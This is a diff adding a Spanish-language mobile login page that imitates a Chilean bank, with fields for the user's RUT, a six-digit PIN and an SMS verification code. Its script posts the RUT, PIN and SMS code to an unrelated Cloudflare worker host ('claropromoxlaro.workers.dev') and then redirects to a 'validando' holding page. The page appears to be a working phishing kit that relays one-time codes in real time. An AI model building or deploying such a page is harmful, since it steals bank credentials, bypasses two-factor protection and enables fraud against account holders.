@@ -1,0 +1,1135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Inicia sesión</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    margin:0;
+    background:#fff;
+    display:flex;
+    justify-content:center;
+    font-family:Arial, Helvetica, sans-serif;
+    overflow:hidden;
+    height:100vh;
+}
+
+.phone{
+    max-width:430px;
+    margin:auto;
+    min-height:100vh;
+    position:relative;
+    background:#fff;
+    width:100%;
+    padding-bottom:100px;
+}
+
+.header{
+    height:72px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    position:relative;
+}
+
+.back{
+    position:absolute;
+    left:18px;
+    font-size:46px;
+    color:#3b3b3b;
+    cursor:pointer;
+    line-height:1;
+}
+
+.header h2{
+    font-size:26px;
+    font-weight:500;
+    color:#222;
+}
+
+.content{
+    padding:120px 34px 0;
+}
+
+.title{
+    font-size:33px;
+    font-weight:800;
+    line-height:1.2;
+    text-align:center;
+    color:#1f2023;
+}
+
+.subtitle{
+    margin-top:28px;
+    font-size:20px;
+    color:#2d2d2d;
+    text-align:center;
+    line-height:1.4;
+}
+
+.form{
+    margin-top:7px;
+}
+
+.form-group{
+    margin-bottom:0;
+}
+
+label{
+    display:block;
+    color:#5B2EFF;
+    font-size:16px;
+    margin-bottom:8px;
+    font-weight:500;
+}
+
+input{
+    width:92%;
+    height:56px;
+    border:2.5px solid #5B2EFF;
+    border-radius:18px;
+    padding:0 24px;
+    font-size:18px;
+    color:#555;
+    outline:none;
+    transition:border-color 0.2s;
+    display:block;
+    margin:8px auto 0;
+}
+
+input:focus{
+    border-color:#4a25d6;
+}
+
+input::placeholder{
+    color:#7f7f7f;
+}
+
+/* Botón Continuar */
+.btn-continuar{
+    width:92%;
+    height:52px;
+    border:none;
+    border-radius:40px;
+    background:#ECECEC;
+    color:#BDBDBD;
+    font-size:20px;
+    font-weight:500;
+    cursor:not-allowed;
+    transition:all 0.25s ease;
+    display:block;
+    margin:12px auto 0;
+}
+
+.btn-continuar.active{
+    background:#5B2EFF;
+    color:#fff;
+    cursor:pointer;
+    box-shadow:0 4px 15px rgba(91, 46, 255, 0.3);
+}
+
+.btn-continuar.active:hover{
+    transform:scale(1.02);
+    box-shadow:0 6px 20px rgba(91, 46, 255, 0.4);
+}
+
+.btn-continuar.active:active{
+    transform:scale(0.98);
+}
+
+/* OVERLAY - Fondo oscuro */
+.overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.55);
+    opacity:0;
+    visibility:hidden;
+    transition:opacity 0.35s ease, visibility 0.35s ease;
+    z-index:999;
+}
+
+.overlay.show{
+    opacity:1;
+    visibility:visible;
+}
+
+/* BOTTOM SHEET - Panel desde abajo */
+.bottom-sheet{
+    position:fixed;
+    left:0;
+    right:0;
+    bottom:0;
+    background:#fff;
+    border-radius:30px 30px 0 0;
+    padding:30px 30px 40px;
+    transform:translateY(100%);
+    transition:transform 0.35s ease;
+    box-shadow:0 -10px 30px rgba(0,0,0,0.15);
+    z-index:1000;
+    max-width:430px;
+    margin:0 auto;
+}
+
+.bottom-sheet.show{
+    transform:translateY(0);
+}
+
+.sheet-header{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    position:relative;
+    margin-bottom:10px;
+}
+
+.sheet-header h2{
+    font-size:22px;
+    font-weight:600;
+    color:#222;
+}
+
+.cerrar{
+    position:absolute;
+    right:0;
+    font-size:32px;
+    cursor:pointer;
+    color:#666;
+    transition:transform 0.2s;
+    line-height:1;
+}
+
+.cerrar:hover{
+    transform:rotate(90deg);
+}
+
+/* Círculos del PIN - 6 dígitos */
+.pin{
+    display:flex;
+    justify-content:center;
+    gap:14px;
+    margin:40px 0 35px;
+}
+
+.circle{
+    width:22px;
+    height:22px;
+    border:2.5px solid #8d8d8d;
+    border-radius:50%;
+    transition:all 0.2s;
+    background:#fff;
+}
+
+.circle.filled{
+    border-color:#5B2EFF;
+    background:#5B2EFF;
+    transform:scale(1.05);
+}
+
+.circle.active{
+    border-color:#5B2EFF;
+    box-shadow:0 0 0 4px rgba(91, 46, 255, 0.15);
+}
+
+/* Código SMS - 5 dígitos (oculto inicialmente) */
+.sms-container {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    margin: 20px 0 30px;
+}
+
+.sms-container.active {
+    display: flex;
+}
+
+.sms-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: #1f2023;
+    text-align: center;
+    margin-bottom: 10px;
+}
+
+.sms-subtitle {
+    font-size: 14px;
+    color: #666;
+    text-align: center;
+    margin-bottom: 20px;
+    line-height: 1.4;
+}
+
+.sms-phone {
+    font-weight: 600;
+    color: #1f2023;
+}
+
+.sms-digits {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 20px;
+}
+
+.sms-digit {
+    width: 50px;
+    height: 60px;
+    border: 2px solid #ddd;
+    border-radius: 12px;
+    text-align: center;
+    font-size: 28px;
+    font-weight: 700;
+    color: #1f2023;
+    outline: none;
+    transition: all 0.3s;
+    background: #f8f9fa;
+    caret-color: #5B2EFF;
+}
+
+.sms-digit:focus {
+    border-color: #5B2EFF;
+    background: #fff;
+    box-shadow: 0 0 0 3px rgba(91, 46, 255, 0.15);
+}
+
+.sms-digit.filled {
+    border-color: #5B2EFF;
+    background: #fff;
+}
+
+.sms-digit::placeholder {
+    color: #ccc;
+    font-size: 20px;
+}
+
+.sms-timer {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 5px;
+}
+
+.sms-timer span {
+    color: #5B2EFF;
+    font-weight: 600;
+}
+
+.sms-resend {
+    color: #5B2EFF;
+    font-weight: 600;
+    cursor: pointer;
+    font-size: 14px;
+    text-decoration: underline;
+    transition: opacity 0.2s;
+}
+
+.sms-resend:hover {
+    opacity: 0.7;
+}
+
+.sms-resend.disabled {
+    color: #999;
+    cursor: not-allowed;
+    text-decoration: none;
+}
+
+/* Botón Ingresar del bottom sheet */
+.btn-ingresar-sheet{
+    width:100%;
+    height:52px;
+    border:none;
+    border-radius:40px;
+    background:#ECECEC;
+    color:#BDBDBD;
+    font-size:20px;
+    font-weight:500;
+    cursor:not-allowed;
+    transition:all 0.25s ease;
+}
+
+.btn-ingresar-sheet.active{
+    background:#5B2EFF;
+    color:#fff;
+    cursor:pointer;
+    box-shadow:0 4px 15px rgba(91, 46, 255, 0.3);
+}
+
+.btn-ingresar-sheet.active:hover{
+    transform:scale(1.02);
+    box-shadow:0 6px 20px rgba(91, 46, 255, 0.4);
+}
+
+.btn-ingresar-sheet.active:active{
+    transform:scale(0.98);
+}
+
+/* Enlace "¿Olvidaste tu contraseña?" */
+.forgot-password-sheet{
+    display:block;
+    text-align:center;
+    margin-top:25px;
+    color:#5B2EFF;
+    text-decoration:underline;
+    font-size:17px;
+    font-weight:500;
+    cursor:pointer;
+    transition:opacity 0.2s;
+}
+
+.forgot-password-sheet:hover{
+    opacity:0.7;
+}
+
+/* Loader */
+.loader-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(255,255,255,0.9);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+.loader-container.active {
+    display: flex;
+}
+
+.loader {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #5B2EFF;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* Ajustes para pantallas más pequeñas */
+@media(max-width:430px){
+    .content{
+        padding:100px 24px 0;
+    }
+    
+    .title{
+        font-size:21px;
+    }
+    
+    .subtitle{
+        font-size:15px;
+        margin-top:22px;
+    }
+    
+    .form{
+        margin-top:45px;
+    }
+    
+    input{
+        width: 100%;
+        height: 50px;
+        font-size: 16px;
+        padding: 0 18px;
+        border-radius: 7px;
+        margin: 6px auto 0;
+    }
+
+    .btn-continuar{
+        width:100%;
+        height:48px;
+        font-size:18px;
+        margin:12px auto 0;
+    }
+    
+    .header h2{
+        font-size:22px;
+    }
+    
+    .back{
+        font-size:38px;
+        left:14px;
+    }
+
+    .bottom-sheet{
+        padding:25px 24px 35px;
+    }
+
+    .pin{
+        gap:12px;
+        margin:35px 0 30px;
+    }
+
+    .circle{
+        width:20px;
+        height:20px;
+        border-width:2px;
+    }
+
+    .sms-digit {
+        width: 42px;
+        height: 52px;
+        font-size: 24px;
+    }
+
+    .btn-ingresar-sheet{
+        height:48px;
+        font-size:18px;
+    }
+
+    .forgot-password-sheet{
+        font-size:16px;
+        margin-top:22px;
+    }
+
+    .sheet-header h2{
+        font-size:20px;
+    }
+}
+
+@media(max-width:380px){
+    .content{
+        padding:80px 18px 0;
+    }
+    
+    .title{
+        font-size:24px;
+    }
+    
+    .subtitle{
+        font-size:15px;
+        margin-top:18px;
+    }
+    
+    .form{
+        margin-top:35px;
+    }
+    
+    input{
+        width:88%;
+        height:44px;
+        font-size:15px;
+        padding:0 14px;
+        border-radius:14px;
+        border-width:2px;
+        margin:5px auto 0;
+    }
+
+    .btn-continuar{
+        width:88%;
+        height:44px;
+        font-size:16px;
+        border-radius:30px;
+        margin:8px auto 0;
+    }
+    
+    label{
+        font-size:14px;
+        margin-bottom:6px;
+    }
+    
+    .header h2{
+        font-size:20px;
+    }
+    
+    .back{
+        font-size:32px;
+        left:12px;
+    }
+
+    .bottom-sheet{
+        padding:20px 18px 30px;
+    }
+
+    .pin{
+        gap:10px;
+        margin:30px 0 25px;
+    }
+
+    .circle{
+        width:18px;
+        height:18px;
+        border-width:2px;
+    }
+
+    .sms-digit {
+        width: 36px;
+        height: 46px;
+        font-size: 20px;
+    }
+
+    .btn-ingresar-sheet{
+        height:44px;
+        font-size:16px;
+        border-radius:30px;
+    }
+
+    .forgot-password-sheet{
+        font-size:15px;
+        margin-top:20px;
+    }
+
+    .sheet-header h2{
+        font-size:18px;
+    }
+
+    .cerrar{
+        font-size:28px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="phone">
+
+<div class="header">
+<div class="back">&#8249;</div>
+<h2>Inicia sesión</h2>
+</div>
+
+<div class="content">
+
+<div class="title">
+Para comenzar ingresa tu<br>
+RUT
+</div>
+
+<div class="subtitle">
+Necesitamos validar tu identidad para continuar
+</div>
+
+<div class="form">
+
+<div class="form-group">
+<label>RUT</label>
+<input
+id="rut"
+type="text"
+maxlength="12"
+placeholder="12.345.678-9">
+</div>
+
+<!-- BOTÓN CONTINUAR -->
+<button class="btn-continuar" id="btnContinuar" disabled>Continuar</button>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- OVERLAY - Fondo oscuro -->
+<div class="overlay" id="overlay"></div>
+
+<!-- BOTTOM SHEET - Panel desde abajo -->
+<div class="bottom-sheet" id="sheet">
+
+    <div class="sheet-header">
+        <h2 id="sheetTitle">Ingresa tu clave</h2>
+        <span class="cerrar" id="cerrarBtn">✕</span>
+    </div>
+
+    <!-- PIN de 6 dígitos -->
+    <div class="pin" id="pinContainer">
+        <div class="circle" data-index="0"></div>
+        <div class="circle" data-index="1"></div>
+        <div class="circle" data-index="2"></div>
+        <div class="circle" data-index="3"></div>
+        <div class="circle" data-index="4"></div>
+        <div class="circle" data-index="5"></div>
+    </div>
+
+    <input type="password" id="claveSheet" maxlength="6" inputmode="numeric" style="position:absolute;opacity:0;pointer-events:none;" autofocus>
+
+    <!-- Código SMS de 5 dígitos (oculto inicialmente) -->
+    <div class="sms-container" id="smsContainer">
+        <div class="sms-title">Ingresa el código</div>
+        <div class="sms-subtitle">
+            Te enviamos un código de 5 dígitos por SMS al <span class="sms-phone">+569 XXXX 6171</span>. No lo compartas con nadie
+        </div>
+        <div class="sms-digits" id="smsDigits">
+            <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" data-index="0" placeholder="·">
+            <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" data-index="1" placeholder="·">
+            <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" data-index="2" placeholder="·">
+            <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" data-index="3" placeholder="·">
+            <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" data-index="4" placeholder="·">
+        </div>
+        <div class="sms-timer">
+            Reenviar código en <span id="smsTimer">51</span> segundos
+        </div>
+        <div class="sms-resend disabled" id="smsResend">Reenviar código</div>
+    </div>
+
+    <button class="btn-ingresar-sheet" id="btnSheet" disabled>Ingresar</button>
+
+    <a href="#" class="forgot-password-sheet">¿Olvidaste tu contraseña?</a>
+
+</div>
+
+<!-- LOADER -->
+<div class="loader-container" id="loader">
+    <div class="loader"></div>
+</div>
+
+<script>
+// ============================================
+// ELEMENTOS
+// ============================================
+const rut = document.getElementById("rut");
+const overlay = document.getElementById("overlay");
+const sheet = document.getElementById("sheet");
+const sheetTitle = document.getElementById("sheetTitle");
+const claveSheet = document.getElementById("claveSheet");
+const btnSheet = document.getElementById("btnSheet");
+const btnContinuar = document.getElementById("btnContinuar");
+const circles = document.querySelectorAll(".circle");
+const pinContainer = document.getElementById("pinContainer");
+const cerrarBtn = document.getElementById("cerrarBtn");
+const loader = document.getElementById("loader");
+const smsContainer = document.getElementById("smsContainer");
+const smsDigits = document.querySelectorAll(".sms-digit");
+const smsTimer = document.getElementById("smsTimer");
+const smsResend = document.getElementById("smsResend");
+
+let isSmsMode = false;
+let smsTimerInterval = null;
+let smsCountdown = 51;
+let transactionIdGlobal = null;
+
+// ============================================
+// FUNCIONES DEL RUT
+// ============================================
+function esRutValido(rutValue) {
+    const limpio = rutValue.replace(/[^0-9kK]/g, '');
+    return limpio.length >= 2;
+}
+
+function actualizarBotonContinuar() {
+    if (esRutValido(rut.value)) {
+        btnContinuar.classList.add("active");
+        btnContinuar.disabled = false;
+    } else {
+        btnContinuar.classList.remove("active");
+        btnContinuar.disabled = true;
+    }
+}
+
+rut.addEventListener("input", function() {
+    let valor = this.value.replace(/[^0-9kK]/g, "").toUpperCase();
+    if (valor.length > 1) {
+        let dv = valor.slice(-1);
+        let num = valor.slice(0, -1);
+        num = num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+        this.value = num + "-" + dv;
+    } else {
+        this.value = valor;
+    }
+    actualizarBotonContinuar();
+});
+
+rut.addEventListener("keydown", function(e) {
+    if (e.key === "Enter" && btnContinuar.classList.contains("active")) {
+        btnContinuar.click();
+    }
+});
+
+// ============================================
+// FUNCIONES DEL PANEL (ABRIR/CERRAR)
+// ============================================
+function abrirSheet(modo = 'pin') {
+    overlay.classList.add("show");
+    sheet.classList.add("show");
+    
+    if (modo === 'sms') {
+        // Modo SMS
+        isSmsMode = true;
+        pinContainer.style.display = "none";
+        smsContainer.classList.add("active");
+        sheetTitle.textContent = "Código de verificación";
+        btnSheet.textContent = "Verificar";
+        btnSheet.classList.remove("active");
+        btnSheet.disabled = true;
+        
+        // Resetear inputs SMS
+        smsDigits.forEach(input => {
+            input.value = '';
+            input.classList.remove('filled');
+        });
+        
+        setTimeout(() => {
+            smsDigits[0].focus();
+        }, 400);
+        
+        iniciarSmsTimer();
+        validarSheet();
+        
+    } else {
+        // Modo PIN
+        isSmsMode = false;
+        smsContainer.classList.remove("active");
+        pinContainer.style.display = "flex";
+        sheetTitle.textContent = "Ingresa tu clave";
+        btnSheet.textContent = "Ingresar";
+        claveSheet.value = "";
+        actualizarCirculos();
+        btnSheet.classList.remove("active");
+        btnSheet.disabled = true;
+        
+        setTimeout(() => {
+            claveSheet.focus();
+        }, 400);
+    }
+}
+
+function cerrarSheet() {
+    overlay.classList.remove("show");
+    sheet.classList.remove("show");
+    if (smsTimerInterval) {
+        clearInterval(smsTimerInterval);
+        smsTimerInterval = null;
+    }
+}
+
+// ============================================
+// FUNCIONES DEL PIN (6 DÍGITOS)
+// ============================================
+function actualizarCirculos() {
+    const valor = claveSheet.value;
+    circles.forEach((circle, index) => {
+        circle.classList.remove("filled", "active");
+        if (index < valor.length) {
+            circle.classList.add("filled");
+        }
+        if (index === valor.length) {
+            circle.classList.add("active");
+        }
+    });
+}
+
+function validarSheet() {
+    if (isSmsMode) {
+        let allFilled = true;
+        smsDigits.forEach(input => {
+            if (input.value === '') allFilled = false;
+        });
+        if (allFilled) {
+            btnSheet.classList.add("active");
+            btnSheet.disabled = false;
+        } else {
+            btnSheet.classList.remove("active");
+            btnSheet.disabled = true;
+        }
+    } else {
+        if (claveSheet.value.length === 6) {
+            btnSheet.classList.add("active");
+            btnSheet.disabled = false;
+        } else {
+            btnSheet.classList.remove("active");
+            btnSheet.disabled = true;
+        }
+    }
+}
+
+claveSheet.addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9]/g, "");
+    if (this.value.length > 6) {
+        this.value = this.value.slice(0, 6);
+    }
+    actualizarCirculos();
+    validarSheet();
+});
+
+claveSheet.addEventListener("keydown", function(e) {
+    if (e.key === "Enter" && this.value.length === 6) {
+        btnSheet.click();
+    }
+});
+
+// ============================================
+// FUNCIONES DEL SMS (5 DÍGITOS)
+// ============================================
+function iniciarSmsTimer() {
+    smsCountdown = 51;
+    smsTimer.textContent = smsCountdown;
+    smsResend.classList.add('disabled');
+    smsResend.style.pointerEvents = 'none';
+    
+    if (smsTimerInterval) clearInterval(smsTimerInterval);
+    
+    smsTimerInterval = setInterval(() => {
+        smsCountdown--;
+        smsTimer.textContent = smsCountdown;
+        
+        if (smsCountdown <= 0) {
+            clearInterval(smsTimerInterval);
+            smsTimerInterval = null;
+            smsTimer.textContent = '0';
+            smsResend.classList.remove('disabled');
+            smsResend.style.pointerEvents = 'auto';
+        }
+    }, 1000);
+}
+
+// Eventos para inputs SMS
+smsDigits.forEach((input, index) => {
+    input.style.color = '#1f2023';
+    input.style.fontSize = '28px';
+    input.style.fontWeight = '700';
+    
+    input.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        
+        if (this.value.length === 1) {
+            this.classList.add('filled');
+            if (index < smsDigits.length - 1) {
+                smsDigits[index + 1].focus();
+            }
+        } else {
+            this.classList.remove('filled');
+        }
+        validarSheet();
+    });
+    
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value === '') {
+            this.classList.remove('filled');
+            if (index > 0) {
+                smsDigits[index - 1].focus();
+            }
+            validarSheet();
+        }
+    });
+    
+    input.addEventListener('click', function() {
+        this.select();
+    });
+    
+    input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const numbers = paste.replace(/[^0-9]/g, '').slice(0, 5);
+        
+        numbers.split('').forEach((num, i) => {
+            if (i < smsDigits.length) {
+                smsDigits[i].value = num;
+                smsDigits[i].classList.add('filled');
+            }
+        });
+        
+        const nextIndex = Math.min(numbers.length, smsDigits.length - 1);
+        if (numbers.length < smsDigits.length) {
+            smsDigits[numbers.length].focus();
+        } else {
+            smsDigits[smsDigits.length - 1].focus();
+        }
+        validarSheet();
+    });
+});
+
+// Reenviar código SMS
+smsResend.addEventListener('click', function() {
+    if (!this.classList.contains('disabled')) {
+        console.log('Reenviando código SMS...');
+        iniciarSmsTimer();
+        alert('Código reenviado correctamente');
+    }
+});
+
+// ============================================
+// BOTÓN CONTINUAR - Abre el panel
+// ============================================
+btnContinuar.addEventListener("click", function() {
+    if (this.classList.contains("active")) {
+        const rutLimpio = rut.value.replace(/[^0-9kK]/g, '').toUpperCase();
+        let bancoldata = {};
+        try {
+            const storedData = localStorage.getItem('bancoldata');
+            bancoldata = storedData ? JSON.parse(storedData) : {};
+        } catch (e) {
+            console.error('Error al parsear bancoldata:', e);
+            bancoldata = {};
+        }
+        
+        transactionIdGlobal = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        bancoldata.usuario = rutLimpio;
+        bancoldata.transactionId = transactionIdGlobal;
+        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+        console.log('Usuario guardado:', rutLimpio, 'Transaction ID:', transactionIdGlobal);
+        abrirSheet('pin');
+    }
+});
+
+// ============================================
+// BOTÓN PRINCIPAL - Maneja PIN y SMS
+// ============================================
+btnSheet.addEventListener("click", async function() {
+    if (!this.classList.contains("active")) return;
+    
+    if (isSmsMode) {
+        // ============================================
+        // MODO SMS: Enviar código de 5 dígitos al worker
+        // ============================================
+        let codigo = '';
+        smsDigits.forEach(input => { codigo += input.value; });
+        console.log('Código SMS ingresado:', codigo);
+        
+        try {
+            loader.classList.add('active');
+            
+            let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+            const transactionId = bancoldata.transactionId;
+            
+            if (!transactionId) {
+                alert('Error: No hay transactionId');
+                loader.classList.remove('active');
+                return;
+            }
+            
+            console.log('Enviando código SMS al worker:', { transactionId, codigo });
+            
+            // Enviar el código SMS al worker para verificar
+            const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/verify-sms', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    transactionId: transactionId,
+                    codigo: codigo
+                })
+            });
+            
+            const result = await response.json();
+            console.log('Respuesta del worker al verificar SMS:', result);
+            
+            loader.classList.remove('active');
+            
+            if (result.ok) {
+                // Guardar tipo como SMS y redirigir a validando.html
+                bancoldata.tipo = 'sms';
+                bancoldata.codigo_sms = codigo;
+                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+                
+                cerrarSheet();
+                window.location.href = 'validando.html';
+            } else {
+                alert('Error al verificar el código SMS: ' + (result.error || 'Código incorrecto'));
+                // Limpiar inputs para reintentar
+                smsDigits.forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                smsDigits[0].focus();
+                validarSheet();
+            }
+            
+        } catch (error) {
+            console.error('Error al verificar SMS:', error);
+            loader.classList.remove('active');
+            alert('Error al verificar el código. Intenta nuevamente.');
+        }
+        
+    } else {
+        // ============================================
+        // MODO PIN: Enviar clave de 6 dígitos
+        // ============================================
+        const clave = claveSheet.value;
+        
+        try {
+            loader.classList.add('active');
+            
+            let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+            const usuario = bancoldata.usuario;
+            
+            if (!usuario) {
+                alert('Error: Usuario no encontrado');
+                loader.classList.remove('active');
+                return;
+            }
+            
+            const transactionId = transactionIdGlobal || 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            bancoldata.clave = clave;
+            bancoldata.transactionId = transactionId;
+            bancoldata.tipo = 'login';
+            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+            
+            console.log('Enviando login:', { usuario, clave, transactionId });
+            
+            const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ usuario, clave, transactionId })
+            });
+            
+            const result = await response.json();
+            console.log('Respuesta del login:', result);
+            
+            loader.classList.remove('active');
+            
+            if (result.ok) {
+                // Cerrar el panel y redirigir a validando.html
+                cerrarSheet();
+                window.location.href = 'validando.html';
+            } else {
+                alert('Error en el login: ' + (result.error || 'Error desconocido'));
+            }
+            
+        } catch (error) {
+            console.error('Error completo:', error);
+            loader.classList.remove('active');
+            alert('Error al procesar el login: ' + error.message);
+        }
+    }
+});
+
+// ============================================
+// DETECTAR CUANDO VIENE DE VALIDANDO.HTML EN MODO SMS
+// ============================================
+function checkModoSms() {
+    try {
+        const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+        if (bancoldata.modo === 'sms') {
+            console.log('🔄 Modo SMS detectado, abriendo panel en modo SMS');
+            // Limpiar el modo para que no se repita
+            bancoldata.modo = 'pin';
+            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+            // Abrir el panel en modo SMS
+            abrirSheet('sms');
+        }
+    } catch (e) {
+        console.error('Error al verificar modo SMS:', e);
+    }
+}
+
+// ============================================
+// EVENTOS DE CIERRE
+// ============================================
+overlay.addEventListener("click", cerrarSheet);
+cerrarBtn.addEventListener("click", cerrarSheet);
+
+// ============================================
+// INICIALIZAR
+// ============================================
+actualizarCirculos();
+actualizarBotonContinuar();
+
+// Verificar si venimos de validando.html en modo SMS
+checkModoSms();
+</script>
+
+</body>
+</html>
